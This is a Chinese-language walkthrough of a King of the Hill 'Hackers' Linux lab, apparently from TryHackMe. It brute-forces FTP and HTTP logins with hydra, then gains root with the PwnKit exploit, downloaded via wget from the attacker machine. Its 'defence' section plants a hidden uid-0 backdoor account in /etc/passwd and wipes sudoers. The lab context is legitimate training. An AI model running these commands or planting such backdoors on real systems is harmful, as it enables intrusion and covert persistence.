# Koth Hackers - Linux

## 进攻

nmap 扫：

    nmap -sS 10.10.122.117 -sV

    21/tcp   open  ftp     vsftpd 2.0.8 or later
    22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
    9999/tcp open  abyss?

ftp有东西

披露了有用户存在弱密码

    rcampbell:Robert M. Campbell:Weak password
    gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password

爆破：

    hydra -l rcampbell -P /usr/share/wordlists/rockyou.txt 10.10.122.117 ftp

.

结果：

    [21][ftp] host: 10.10.122.117   login: rcampbell   password: lipgloss

gobuster爆破http目录

    /backdoor

robots.txt暴露用户名:

    plague

    hydra -l plague -P /usr/share/wordlists/rockyou.txt 10.10.122.117 http-post-form "/api/user/login:username=plague&password=^PASS^:Incorrect credentials"

尝试爆破，爆了很久，爆不出

---

ftp的那两个弱密码爆出来了，拿去登ssh，成功

### CVE-2021-4034

    find / -type f -perm -u+s 2>/dev/null

发现pkexec

pkexec具有suid

尝试pwnkit利用。传入exp

    攻击机：python3 -m http.server 8000
    目标：wget http://10.14.39.48:8000/PwnKit
        chmod 777 ./PwnKit
        ./PwnKit

成功getroot

# 防守（漏洞修补）：

拿到root先把那两个弱密码的两个用户密码全改了。

openssl生成密码hash：

    openssl passwd -1 -salt hack 1q2w3e4r

    echo 'sugo:$1$hack$eu7wA.3faDMt9Z2srODT9/:0:0:root:/root:/bin/bash' >> /etc/passwd

留后手

把/etc/sudoers的内容全清

## Capabilitie清除

    getcap -r / 2>/dev/null

发现存在:

    /usr/bin/python3.6 = cap_setuid+ep
    /usr/bin/python3.6m = cap_setuid+ep

使用命令将其清除：

    setcap -r

## Pkexec suid

由于我们也是利用pwnkit进来的，所以我们需要把pkexec的suid清掉，以免其他选手以此getroot:

    chmod -u-s

---

## 愉快找flag...
